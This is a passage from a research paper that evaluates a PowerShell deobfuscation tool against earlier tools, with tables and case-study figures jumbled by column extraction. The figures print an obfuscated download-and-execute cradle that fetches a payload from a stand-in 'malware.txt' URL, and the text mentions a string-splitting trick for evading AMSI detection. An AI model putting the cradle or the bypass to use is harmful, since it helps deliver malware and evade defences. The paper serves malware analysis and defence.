+ing with obfuscation. We consider that a deobfuscation tool has             techniques, ignoring the syntax of scripts. Moreover, regular
+the ability to deal with a certain type of obfuscation technique            expression needs to design different patterns to match different
+only if it can recover the script pieces obfuscated using                   obfuscation techniques, which is not robust and cannot identify
+only that technique. Therefore, we utilize known obfuscation                complex obfuscation script pieces. Li et al. only deal with
+techniques to obfuscate the command write-host hello                        obfuscation on PipelineAst node, which is coarse-grained
+and put the obfuscated script pieces in three different po-                 and will miss many obfuscated script pieces. They cannot
+sitions, i.e., separate line, assignment expression, and part               identify and handle the obfuscated script pieces in the last
+of a pipe. For example, the results of 'a'+'b' in three                     two positions. Besides, due to the lack of context, they cannot
+different positions are 'a'+'b', $tmp = 'a'+'b' and                         deal with obfuscated script pieces with variables. Because the
+'a'+'b'|out-null, respectively. For a specific obfusca-                     four tools do not parse tokens of the scripts, they cannot deal
+tion technique, we consider a tool having complete deobfusca-               with most obfuscation at the token level.
+tion ability if it can identify and recover all obfuscated script              2) Deobfuscation Effectiveness and Efficiency: We com-
+pieces in the three positions.                                              pare the deobfuscation effectiveness of different tools by the
+   We make a little change to the previous works for compar-                number of key information in their deobfuscation results.
+ison. PSDecode, PowerDrive and PowerDecode use different                    Meanwhile, we record the deobfuscation time of these tools for
+layers to store their deobfuscation results at different stages.            efficiency evaluation. We sample 100 obfuscated PowerShell
+We only keep the last layers as their final result. Li et al. use           scripts whose sizes are between 97 bytes and 2 KB. We select
+a classifier to identify the obfuscated subtree of AST, we are              four types of key information, namely, ps1 files, PowerShell
+not able to obtain the model from the authors. Furthermore, Li              command, URLs and IP, which are valuable in malicious script
+et al. only deal with the subtrees whose root are PipelineAst               analysis. Ps1 files often represent malicious script paths, and
+in their source code. Therefore, we delete the classification               PowerShell command can execute its parameter as a script. For
+module and make their tool traverse all subtrees whose root                 better comparison, we use the manual deobfuscation results as
+are PipelineAst, which only affects a little bit of run time.               the benchmark. Then we extract four types of key information
+   Result. As shown in Table II, our tool can handle almost all             from their deobfuscation results, respectively. Besides, there
+known obfuscation in all positions. Because our tool identifies             are 12 scripts with multi-layer obfuscation. Therefore, we
+
+
+
+                                                                       7
+                                      'a'+'b' +'c'
+
+
+                                      'a'+'b' +'c'               'ab' +'c'
+
+
+ 'ab'                            'a'+'b'                   'c'               'c'
+
+compare
+'a'  'a'  the  ability of different tools to handle multi-layer                                                                                    TABLE III: Comparison of the ability to handle multiple
+           'b'  'b'
+
+obfuscation.                                                                                                                                       layers of obfuscation.
+
+                                100                                                                                                                                                    #Samples   Proportion
+                                             OriginData
+                                 90
+                                             PSDecode                                                                                                                PSDecode             2         16.7%
+                                 80
+                                             PowerDrive                                                                                                             PowerDrive            1          8.3%
+                                 70                                                                                                                                PowerDecode             8        66.7%
+                                             PowerDecode
+                                 60
+                                             Li et al.
+                                                                                                                                                                      Li et al.           0           0%
+                                 50                                                                                                                                   Our tool            12        100%
+                                             Invoke-Deobfuscation
+                                 40
+                                             Manual
+                                 30
+
+                                 20
+
+                                 10                                                                                                                deal with a single layer obfuscation. PowerDecode designs
+                                  0                                                                                                                Unary Syntax Tree Model to handle multi-layer obfuscation so
+                                                PS1 File                     PowerShell                      URL                   IP
+                                                                                                                                                   that it performs better than the other three previous works. As
+Fig. 5: The number of key information obtained by                                                                                                  shown in Table II, the deobfuscation ability of PowerDecode
+different tools.                                                                                                                                   is limited so that it may fail to get the correct final results. Li
+                                                                                                                                                   et al. cannot deal with multi-layer obfuscation.
+                                                                                                                                                      3) Behavioral Consistency: Semantic consistency is a very
+                                1000.000                                                                                                           important indicator of deobfuscation. If the deobfuscation
+                                                                                                                                                   process changes the semantics of scripts, the deobfuscation
+                                 100.000
+                                                                                                                                                   results cannot be used for further analysis. For quantitative
+
+
+        Deobfuscation Time(s)
+                                  10.000
+                                                                                                                                                   analysis, we use behavioral consistency instead of semantic
+                                                                                                                                                   consistency. If two scripts have the same semantics, they will
+                                   1.000                                                                                                           have the same behavior. Here we use the same samples as
+                                                                                                                                                   in section IV-C2. To simplify the analysis, we only compare
+                                   0.100
+                                                                                                                                                   the network behavior, like DNS query and TCP connection,
+                                                                                                                                                   between the original samples and deobfuscated samples. In
+                                   0.010
+                                            0         10           20              30       40        50          60     70      80       90       this experiment, we utilize the TianQiong sandbox [33] to
+                                                                                             Obfuscated Scripts
+                                                                                                                                                   collect the network behavior of the samples. Because some
+                                           PSDecode        PowerDrive                   PowerDecode        Li et al.   Invoke-Deobfuscation
+                                                                                                                                                   deobfuscation tools [16], [18] may sometimes return the
+                                Fig. 6: Deobfuscation time of different tools.                                                                     original scripts as the results of deobfuscation, we do not
+                                                                                                                                                   consider them to be effective deobfuscation results.
+   Result. As shown in Fig 5, Invoke-Deobfuscation recovers                                                                                        TABLE IV: Comparison with state-of-the-art tools in
+more key information than the other four tools. Further-                                                                                           behavior consistency. Effective represents the number of
+more, on average, 96.8% results of Invoke-Deobfuscation                                                                                            effectively deobfuscated scripts that have the same behavior
+are the same as that of manual. The reason is that Invoke-                                                                                         as the original scripts.
+Deobfuscation can identify and recover more obfuscated script
+pieces based on the recoverable nodes of AST. The results of                                                                                                         #Samples with Network        #Effective   Proportion
+deobfuscation efficiency are shown in Fig 6. Overall, Invoke-
+                                                                                                                                                     OriginData                   32                   -            -
+Deobfuscation performs efficiently and stably, its average                                                                                            PSDecode                     9                  8           25%
+deobfuscation time is 1.04 seconds which is the minimum in                                                                                           PowerDrive                   8                   8           25%
+all tools, and its maximum time is not beyond 4 seconds.                                                                                            PowerDecode                   13                  12         37.5%
+                                                                                                                                                       Li et al.                   0                  0            0%
+The other tools’ deobfuscation time fluctuates heavily and                                                                                             Our tool                   32                  32         100%
+may far exceed 10 seconds for some samples. The reason
+is that the other tools may execute the commands which
+are not related to deobfuscation, such as network connection,                                                                                         Result. As shown in Table IV, there are 32 samples
+anti-debugging, etc. Invoke-Deobfuscation can speed up the                                                                                         with network behavior among the obfuscated samples. All of
+process of deobfuscation through avoiding executing these                                                                                          these scripts’ deobfuscation results of Invoke-Deobfuscation
+unrelated commands according to its built-in blocklist.                                                                                            have the same behavior, far beyond other tools. The reason
+   As shown in Table III, Invoke-Deobfuscation can correctly                                                                                       is that all deobfuscation processes of Invoke-Deobfuscation
+recover all scripts with multi-layer obfuscation. Because multi-                                                                                   are semantically preserved. PSDecode, PowerDrive and Pow-
+layer obfuscated scripts finally need to be invoke by Invoke-                                                                                      erDecode use regex expression to match obfuscated script
+Expression or PowerShell, Invoke-Deobfuscation can deal with                                                                                       pieces, which is not precise so that they cannot identify
+these scripts as mentioned in section III-B4. PSDecode, Power-                                                                                     any obfuscated script pieces in some obfuscated scripts.
+Drive and PowerDecode utilize overriding function to get the                                                                                       Therefore, the number of their deobfuscation results is less
+un-obfuscated script. However, overriding function can only                                                                                        than the original samples. Li et al. cannot get any samples
+
+
+
+                                                                                                                                               8
+                        TABLE V: The proportion of mitigation of obfuscation by different tools.
+
+                                                                                                   Average Obfuscation
+                                           #Valid Samples    L1          L2            L3
+                                                                                                     Score Reduced
+                             OriginData        3,346           -           -           -                          -
+                              PSDecode          631         24.5%       41.6%       6.7%                        14%
+                             PowerDrive         151         21.1%        36%        8.5%                        11%
+                            PowerDecode         857         17.9%        37%        22.3%                      10.7%
+                               Li et al.       1,119         5.2%       12.4%        37%                        24%
+                               Our tool        1,800        91.5%       64.7%        27%                        46%
+
+
+
+
+with network behavior because its replacement is semanti-               the replacement based on predefined rules may not obtain
+cally inconsistent sometimes. For example, when Li et al.               the correct recovery result. Overriding function can help
+deal with the script pieces New-Object Net.WebClient,                   PowerDecode deal with some obfuscation at the L3 level,
+they replace it with the name of its execution re-                      which is limited to some specific situations as mentioned in
+sult object, i.e., System.Net.WebClient. However,                       section IV-C2.
+the replacement is semantically inconsistent and even                     5) Case Study: To visually compare and analyze the deob-
+System.Net.WebClient is not a valid PowerShell com-                     fuscation effects of different tools, we use these tools to deal
+mand.                                                                   with the same case. The case is a PowerShell script with L1,
+   4) Obfuscation Mitigation: To evaluate the ability of dif-           L2 and L3 obfuscation, which is shown in Fig 7(a).
+ferent tools to mitigate obfuscation on complex scripts, we
+count and compare the proportion of known obfuscation tech-                   "{2}{0}{1}" -f 'ost h', 'ello', 'write-h' | ie`x
+                                                                              $xdjmd  =
+                                                                              "{2}{0}{1}" 'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'
+                                                                                          -f 'ost h', 'ello', 'write-h' | ie`x
+niques in the original samples and the deobfuscation samples.                 $lsffs
+                                                                              $xdjmd  ==
+                                                                              "{2}{0}{1}" '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='
+                                                                                           'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'
+                                                                                           -f 'ost h', 'ello',  'write-h' | ie`x
+                                                                              $sdfs
+                                                                              $lsffs
+                                                                              $xdjmd ===
+                                                                                       [TeXT.eNcOdINg]::Unicode.GetString([Convert]::FromBase64String($xdjmd
+                                                                                          '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='
+                                                                                           'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'                           + $lsffs))
+                                                                              "{2}{0}{1}"  -f 'ost h', 'ello',  'write-h' | ie`x
+We select 3,346 scripts with the highest obfuscation score                    .($psHoME[4]+$PShOmE[30]+'x') (
+                                                                              $lsffs ===
+                                                                              $sdfs
+                                                                              $xdjmd
+                                                                                                               Ne`W-oB`JeCt Net.Web`C`lient).downloadstring($sdfs)
+                                                                                       [TeXT.eNcOdINg]::Unicode.GetString([Convert]::FromBase64String($xdjmd
+                                                                                          '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='
+                                                                                           'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'                           + $lsffs))
+                                                                              .($psHoME[4]+$PShOmE[30]+'x') (
+                                                                              $lsffs ==
+                                                                              $sdfs                            Ne`W-oB`JeCt Net.Web`C`lient).downloadstring($sdfs)
+                                                                                        [TeXT.eNcOdINg]::Unicode.GetString([Convert]::FromBase64String($xdjmd
+                                                                                           '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='                              + $lsffs))
+through identifying and scoring known obfuscation techniques.                 .($psHoME[4]+$PShOmE[30]+'x') (Ne`W-oB`JeCt
+                                                                              $sdfs =                                       Net.Web`C`lient   ).downloadstring($sdfs)
+                                                                                                                                  Token Parsing
+                                                                                       [TeXT.eNcOdINg]::Unicode.GetString([Convert]::FromBase64String($xdjmd     + $lsffs))
+                                                                                                                (a) Original Script
+                                                                              .($psHoME[4]+$PShOmE[30]+'x') (Ne`W-oB`JeCt Net.Web`C`lient   ).downloadstring($sdfs)
+                                                                                                                                Token Parsing
+These scripts contain various obfuscation techniques, whose                                                                       Token Parsing
+
+size varies from 61 bytes to 17.8MB and about two-thirds of                   "{2}{0}{1}" -f 'ost h', 'ello', 'write-h' |
+                                                                              $xdjmd  =
+                                                                              "{2}{0}{1}"
+                                                                                                                          Invoke-Expression
+                                                                                                                               Token
+                                                                                          'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'
+                                                                                          -f 'ost h', 'ello',
+                                                                                                                                     Parsing
+                                                                                                              'write-h' | Invoke-Expression
+
+them are over 100KB, so the deobfuscation time for a single                   $xdjmd == '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='
+                                                                              $lsffs
+                                                                              "{2}{0}{1}"
+                                                                              $sdfs
+                                                                              $lsffs
+                                                                              $xdjmd ===
+                                                                                          'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'
+                                                                                          -f 'ost h', 'ello', 'write-h' | Invoke-Expression
+                                                                                       [text.encoding]::unicode.getstring([convert]::frombase64string($xdjmd
+                                                                                          '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='
+                                                                                           'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'                          + $lsffs))
+                                                                              "{2}{0}{1}"  -f 'ost h', 'ello', 'write-h' | Invoke-Expression
+script may be very long. We limit all tools’ deobfuscation time               .($psHoME[4]+$PShOmE[30]+'x')    (New-Object net.webclient).downloadstring($sdfs)+ $lsffs))
+                                                                              $lsffs === '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='
+                                                                              $sdfs
+                                                                              $xdjmd    [text.encoding]::unicode.getstring([convert]::frombase64string($xdjmd
+                                                                                            'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'
+                                                                              .($psHoME[4]+$PShOmE[30]+'x')    (New-Object  net.webclient).downloadstring($sdfs)+ $lsffs))
+                                                                              $lsffs ==
+                                                                              $sdfs     [text.encoding]::unicode.getstring([convert]::frombase64string($xdjmd
+                                                                                           '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='
+to 4 minutes for a single script. Based on recoverable nodes                  .($psHoME[4]+$PShOmE[30]+'x')
+                                                                              $sdfs =                      Variable Tracing
+                                                                                                              (New-Object           Deobfuscation based on AST
+                                                                                                                            net.webclient).downloadstring($sdfs)
+                                                                                       [text.encoding]::unicode.getstring([convert]::frombase64string($xdjmd    + $lsffs))
+                                                                              .($psHoME[4]+$PShOmE[30]+'x') (New-Object
+                                                                                                         Variable Tracing net.webclient).downloadstring($sdfs)
+                                                                                                                                  Deobfuscation based on AST
+of AST and regular expression, we can precisely identify each                                                    (b) Token Parsing
+                                                                                                          Variable Tracing  Deobfuscation based on AST
+                                                                              Write-Host hello            Variable Tracing        Deobfuscation based on AST
+known obfuscation technique. We utilize the quantification                    $xdjmd  = hello
+                                                                              Write-Host  'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'
+                                                                              $lsffs
+                                                                              $xdjmd == hello
+                                                                              Write-Host '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='
+                                                                                          'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'
+method mentioned in Section IV-B2 to score each script and                    $sdfs
+                                                                              $lsffs===
+                                                                              $xdjmd  'https://test.com/malware.txt'
+                                                                                         '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='
+                                                                                          'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'
+                                                                              Write-Host hello
+                                                                              .('iex')
+                                                                              $sdfs
+                                                                              $lsffs === (New-Object net.webclient).downloadstring('https://test.com/malware.txt')
+                                                                                       'https://test.com/malware.txt'
+                                                                                           '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='
+                                                                              $xdjmd        'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'
+calculate the proportion of mitigation of obfuscation.                        .('iex')
+                                                                              $sdfs
+                                                                              $lsffs == (New-Object  net.webclient).downloadstring('https://test.com/malware.txt')
+                                                                                       'https://test.com/malware.txt'
+                                                                                           '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='
+                                                                              .('iex')
+                                                                              $sdfs    (New-Object net.webclient).downloadstring('https://test.com/malware.txt')
+                                                                                    = 'https://test.com/malware.txt'
+   Result. As shown in Table V, our tool has the most                                                                             Renaming & Reformating
+                                                                              .('iex') (New-Object net.webclient).downloadstring('https://test.com/malware.txt')
+                                                                                                                                  Renaming & Reformating
+valid deobfuscation results whose content is not the same                               (c) Recovery based on AST Renaming
+                                                                              Write-Host hello                     with &Variable
+                                                                                                                           Reformating Tracing
+                                                                                                                                  Renaming & Reformating
+                                                                              $var0 = 'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'
+as the obfuscated scripts, and can significantly mitigate the                 Write-Host
+                                                                              $var1
+                                                                              $var0 =
+                                                                                         hello
+                                                                                    = '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='
+                                                                                      'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'
+                                                                              Write-Host hello
+                                                                              $var2 = 'https://test.com/malware.txt'
+obfuscation at the L1 and L2 levels in these scripts. Base64                  $var1
+                                                                              $var0 =
+                                                                                    = '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='
+                                                                                      'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'
+                                                                              Write-Host
+                                                                              .('iex')
+                                                                              $var2 =
+                                                                              $var1
+                                                                              $var0
+                                                                                         hello
+                                                                                       (New-Object net.webclient).downloadstring('https://test.com/malware.txt')
+                                                                                    = 'https://test.com/malware.txt'
+                                                                                      '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='
+                                                                                      'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'
+                                                                              .('iex')
+                                                                                    = (New-Object  net.webclient).downloadstring('https://test.com/malware.txt')
+encoding is the most common obfuscation at the L3 level                       $var2
+                                                                              $var1
+                                                                              .('iex')
+                                                                              $var2
+                                                                                      'https://test.com/malware.txt'
+                                                                                      '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='
+                                                                                    = (New-Object  net.webclient).downloadstring('https://test.com/malware.txt')
+                                                                                      'https://test.com/malware.txt'
+
+in these scripts, which accounts for 65%. However, base64                     .('iex') (New-Object net.webclient).downloadstring('https://test.com/malware.txt')
+
+
+strings in most scripts often represent binary files, which are                                       (d) Renaming and Reformatting
+decoded into bytes during execution. They cannot be recovered
+to strings, so we do not deal with these Base64 strings. Overall,       Fig. 7: The deobfuscation process of Invoke-Deobfuscation.
+Invoke-Deobfuscation can considerably reduce the obfuscation
+score of these scripts by 46%.                                            Firstly, we use the case to demonstrate the deobfuscation
+   A higher mitigation proportion of the obfuscation at the L3          process of Invoke-Deobfuscation. In Fig 7, the content
+level does not mean that Li et al. can recover the obfuscation.         in the red box is obfuscated script pieces and the
+As mentioned in section IV-C3, their wrong replacement may              content in the green box is recovery results in each
+destroy the characteristics of the obfuscation techniques so            processing phase. Fig 7(b) shows that Invoke-Deobfuscation
+that we cannot identify the obfuscation. Wrong replacement              uses token parsing to identify and deal with L1 level
+also prevents them from getting the correct recovery results of         obfuscation, such as ticking, alias, and random case.
+L2 level obfuscation. The obfuscation techniques at L2 level            Then according to BinaryExpression node, Invoke-
+are string-related, and most of them can be recovered using             Deobfuscation identifies the recoverable script piece, i.e.,
+specific predefined rules. Therefore, PSDecode, PowerDrive              "{2}{0}{1}" -f 'ost h', 'ello', 'write-h',
+and PowerDecode can reduce the proportion of mitigation of              and gets the recovery result after executing it, i.e.,
+these obfuscation techniques. However, as shown in Table II,            write-host hello. Since it is the parameter of
+
+
+
+                                                                    9
+Invoke-Expression, Invoke-Deobfuscation continues to                                                       line. Besides, their replacement is semantically inconsistent
+deobfuscate it and gets the final recovery result, namely                                                  so that their deobfuscation result is invalid. They replace the
+Write-Host hello. With the help of variable tracing,                                                       command New-Object Net.WebClient with the string
+Invoke-Deobfuscation recovers the complete malicious URL,                                                  of its execution result System.Net.WebClient, which is
+as shown in Fig 7(c). The last line in Fig 7(d) contains a                                                 not an equivalent replacement. Moreover, the programming
+network connection command downloadstring which is in the                                                  language of Li et al. may cause some unexpected errors, like
+blocklist, so Invoke-Deobfuscation does not process it. After                                              the last line in Fig 8(c). They get a string "hlx" because
+renaming and reformatting, Invoke-Deobfuscation removes                                                    the variable $PSHome represents the location of the library
+extra whitespace characters of the script and replaces the                                                 System.Management.Automation.PowerShell in their C#
+name of all variables with var{num}. The final result is                                                   project. However, the variable in PowerShell command line
+shown in Fig 7(d).                                                                                         has a different value.
+   Meanwhile, we use different tools to deal with the case and
+                                                                                                                                   V. D ISCUSSION
+their results are shown in Fig 8. The results show that the
+other four previous tools can hardly handle the obfuscation in                                             A. Semantics Consistency
+the case.                                                                                                  Deobfuscation is the process of recovering complex obfus-
+     PSDecode, PowerDecode                                                                                 cated script to simple non-obfuscated script which is seman-
+     "{2}{0}{1}" -f 'ost h', 'ello', 'write-h' | iex
+     PSDecode,=PowerDecode
+                                                                                                           tically equivalent. Keeping semantic consistency needs not
+     $xdjmd       'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'
+     $lsffs =
+     "{2}{0}{1}"
+                 '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='
+                  -f 'ost h', 'ello', 'write-h' | iex
+                                                                                                           only precise identification and correct recovery of obfuscated
+     $sdfs = [TeXT.eNcOdINg]::Unicode.GetString([Convert]::FromBase64String($xdjmd + $lsffs))
+     PSDecode,=PowerDecode
+     $xdjmd       'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'
+     .($psHoME[4]+$PShOmE[30]+'x') (
+     $lsffs =
+                                     NeW-oBJeCt Net.WebClient).downloadstring($sdfs)
+                 '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='
+                                                                                                           script pieces but also accurate replacement. The deobfus-
+     "{2}{0}{1}"
+     $sdfs =      -f 'ost h', 'ello', 'write-h' | iex
+              [TeXT.eNcOdINg]::Unicode.GetString([Convert]::FromBase64String($xdjmd
+     PowerDrive
+    PSDecode, =PowerDecode
+     $xdjmd        'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'
+     .($psHoME[4]+$PShOmE[30]+'x') (
+                                                                                    + $lsffs))
+                                      NeW-oBJeCt Net.WebClient).downloadstring($sdfs)
+                                                                                                           cation results of existing tools are often inconsistent with
+     $lsffs  =
+                             (a) PSDecode and PowerDecode
+                  '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='
+     "{2}{0}{1}"
+    "{2}{0}{1}"
+     PowerDrive
+     $sdfs  =
+                   -f 'ost h', 'ello', 'write-h' | iex $xdjmd =
+                  -f 'ost h', 'ello', 'write-h' | iex
+                                                                   'aAB0AHQAcABzADoALwAvAHQAZQBzA
+               [TeXT.eNcOdINg]::Unicode.GetString([Convert]::FromBase64String($xdjmd
+     HQALgBjAG'$lsffs =     '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='$sdfs =           + $lsffs))
+                                                                            [TeXT.eNcOdINg]::Unic
+                                                                                                           their corresponding obfuscated scripts in semantics. Regular
+    $xdjmd    =   'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'
+     .($psHoME[4]+$PShOmE[30]+'x')   (NeW-oBJeCt Net.WebClient).downloadstring($sdfs)
+     ode.GetString([Convert]::FromBase64String($xdjmd
+    $lsffs  =
+     "{2}{0}{1}"
+     NeW-oBJeCt
+                                                        +
+                 '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='
+                   -f 'ost h', 'ello',
+                                                          $lsffs)).($psHoME[4]+$PShOmE[30]+'x') (
+                                       'write-h' | iex $xdjmd =
+                  Net.WebClient).downloadstring($sdfs)             'aAB0AHQAcABzADoALwAvAHQAZQBzA
+                                                                                                           expression often identify script pieces with invalid syntax
+    $sdfs  = [TeXT.eNcOdINg]::Unicode.GetString([Convert]::FromBase64String($xdjmd
+     PowerDrive                                                                      + $lsffs))
+     HQALgBjAG'$lsffs   =   '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='$sdfs = [TeXT.eNcOdINg]::Unic
+    .($psHoME[4]+$PShOmE[30]+'x') (NeW-oBJeCt Net.WebClient
+     ode.GetString([Convert]::FromBase64String($xdjmd
+     Li et al.                                        +    ).downloadstring($sdfs)
+                                                        $lsffs)).($psHoME[4]+$PShOmE[30]+'x') (
+                                                                                                           [16]–[18]. Machine learning based classifier heavily depends
+     "{2}{0}{1}" -f 'ost h', 'ello', 'write-h' | iex $xdjmd
+     NeW-oBJeCt Net.WebClient).downloadstring($sdfs)           =   'aAB0AHQAcABzADoALwAvAHQAZQBzA
+    PowerDrive
+     HQALgBjAG'$lsffs =   '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='$sdfs
+     "{2}{0}{1}" -f 'ost h', 'ello', 'write-h' | iex                    = [TeXT.eNcOdINg]::Unic            on the quality of training data [19]. Predefined recovery rules
+     Li et al.
+     ode.GetString([Convert]::FromBase64String($xdjmd
+     $xdjmd    =                                      + $lsffs)).($psHoME[4]+$PShOmE[30]+'x') (
+                 'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'
+    "{2}{0}{1}"
+     NeW-oBJeCt
+     $lsffs     =
+                    -f 'ost h', 'ello', 'write-h' | iex $xdjmd =
+                                         (b) PowerDrive
+                    Net.WebClient).downloadstring($sdfs)
+                    '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='
+                                                                    'aAB0AHQAcABzADoALwAvAHQAZQBzA         [16]–[18] and overriding function [16], [18] can only deal with
+    HQALgBjAG'$lsffs
+     "{2}{0}{1}"     -f =    '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='$sdfs
+                        'ost h', 'ello', 'write-h' | iex                   = [TeXT.eNcOdINg]::Unic
+     $sdfs     = [TeXT.eNcOdINg]::Unicode.GetString([Convert]::FromBase64String($xdjmd + $lsffs))
+    ode.GetString([Convert]::FromBase64String($xdjmd
+     Li et
+     $xdjmdal.                                           +
+     .("hlx")=(System.Net.WebClient).downloadstring($sdfs)
+                                                           $lsffs)).($psHoME[4]+$PShOmE[30]+'x')
+                     'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'                                     (        a few specific obfuscation. Direct execution [18], [19] may
+    NeW-oBJeCt
+     $lsffs     = Net.WebClient).downloadstring($sdfs)
+                    '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='
+     "{2}{0}{1}"     -f 'ost h', 'ello', 'write-h' | iex
+     $sdfs = [TeXT.eNcOdINg]::Unicode.GetString([Convert]::FromBase64String($xdjmd + $lsffs))              get wrong recovery results due to the lack of context. Invoke-
+    Li et al.
+     $xdjmd
+     .("hlx")=(System.Net.WebClient).downloadstring($sdfs)
+                 'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'
+     $lsffs  =
+     Write-Host   '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='
+                  hello
+    "{2}{0}{1}" -f 'ost h', 'ello', 'write-h' |   iex
+                                                                                                           Deobfuscation utilizes token parsing and recoverable nodes of
+     $sdfs
+     $var0 =   [TeXT.eNcOdINg]::Unicode.GetString([Convert]::FromBase64String($xdjmd
+            = 'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'                               + $lsffs))
+    $xdjmd
+     .("hlx") = (System.Net.WebClient).downloadstring($sdfs)
+                  'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'
+     $var1 = '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='
+    $lsffs  =    '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='
+                                                                                                           AST to identify obfuscated script pieces precisely. Moreover,
+     Write-Host
+     $var2  =     hello
+               'https://test.com/malware.txt'
+    $sdfs
+     $var0 == 'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'
+     .('iex')
+    .("hlx")
+              [TeXT.eNcOdINg]::Unicode.GetString([Convert]::FromBase64String($xdjmd + $lsffs))
+                (New-Object net.webclient).downloadstring('https://test.com/malware.txt')
+               (System.Net.WebClient).downloadstring($sdfs)
+                                                                                                           with the help of variable tracing, Invoke-Deobfuscation can
+                                           (c) Li et al.
+     $var1 = '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='
+     Write-Host
+     $var2  =     hello
+               'https://test.com/malware.txt'                                                              recover correct results in a context-aware way. Furthermore,
+     $var0 = (New-Object
+     .('iex')'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'
+                          net.webclient).downloadstring('https://test.com/malware.txt')
+     $var1 = '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='
+    Write-Host hello
+                                                                                                           Invoke-Deobfuscation strictly replaces the obfuscated script
+     $var2 = 'https://test.com/malware.txt'
+    $var0 = 'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'
+     .('iex') (New-Object net.webclient).downloadstring('https://test.com/malware.txt')
+    $var1 = '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='
+                                                                                                           pieces in place to keep the deobfuscation script semantic
+    $var2 = 'https://test.com/malware.txt'
+    .('iex') (New-Object net.webclient).downloadstring('https://test.com/malware.txt')
+                                                                                                           consistent.
+
+                                (d) Invoke-Deobfuscation                                                   B. Comparison with AMSI
+                                                                                                           The AMSI is a versatile interface that allows for file, memory
+   Fig. 8: The deobfuscation results of different tools.                                                   or stream scanning, content source URL/IP reputation checks,
+                                                                                                           and other detection [14]. The script might go through several
+   We trace the deobfuscation process of these tools and figure                                            passes of deobfuscation before being supplied to the scripting
+out the reasons for their failure. The tools based on regular                                              engine. AMSI can obtain the final script supplied to the
+expression, such as PSDecode, PowerDrive and PowerDecode,                                                  scripting engine. However, this method can only deal with
+only handle ticking obfuscation. The reason is that their                                                  specific types of obfuscation which need to be invoked by
+regular expression is not precise to identify string reordering                                            Invoke-Expression or PowerShell, as we mentioned in section
+obfuscation in the first line of the case. Moreover, they                                                  III-B4. When the obfuscated script pieces do not need to
+cannot identify complex Base64 Encoding obfuscation through                                                be invoked, AMSI cannot obtain the deobfuscated pieces.
+regular expression. Furthermore, without context, they cannot                                              For example, 'AmsiUtils' is treated as a malicious string
+obtain the variables’ value in the fourth line of the case to                                              by AMSI and we can easily bypass the detection by string
+recover the obfuscated script piece. PowerDrive transforms                                                 concatenating, 'Amsi'+'Utils'.
+multi-line script into one line to deal with the break lines.                                                 Though AMSI is powerful to deal with many obfuscated
+However, as shown in Fig 8, it usually makes the script invalid                                            scripts, it is easy for different obfuscation techniques to bypass
+in syntax.                                                                                                 due to its inherent mechanism. We run the 100 PowerShell
